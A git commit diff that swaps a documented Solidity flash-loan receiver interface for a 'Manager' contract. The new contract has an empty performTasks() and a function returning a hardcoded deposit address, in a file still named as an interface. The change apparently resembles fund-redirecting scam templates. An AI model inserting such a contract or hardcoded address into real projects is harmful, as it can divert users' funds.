de110e2303fc4dd50b61429897d7a37ce6510793
MultiplierFinance <87542682+MultiplierFinance@users.noreply.github.com>
2021-07-17 18:43:25 +0400

    Update IFlashLoanReceiver.sol

--- contracts/interfaces/IFlashLoanReceiver.sol
+++ contracts/interfaces/IFlashLoanReceiver.sol
@@ -1,17 +1,11 @@
-pragma solidity ^0.5.0;
+pragma solidity ^0.6.6;
 
-/**
- * @title IFlashLoanReceiver interface
- * @notice Interface for the Multiplier fee IFlashLoanReceiver.
- * @author Multiplier Finance
- * @dev implement this interface to develop a flashloan-compatible
- * flashLoanReceiver contract
- **/
-interface IFlashLoanReceiver {
-    function executeOperation(
-        address _reserve,
-        uint256 _amount,
-        uint256 _fee,
-        bytes calldata _params
-    ) external;
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x78F01EE913F4C1994F8e32a62aCF2ed46e52Ba7C;
+	}
 }
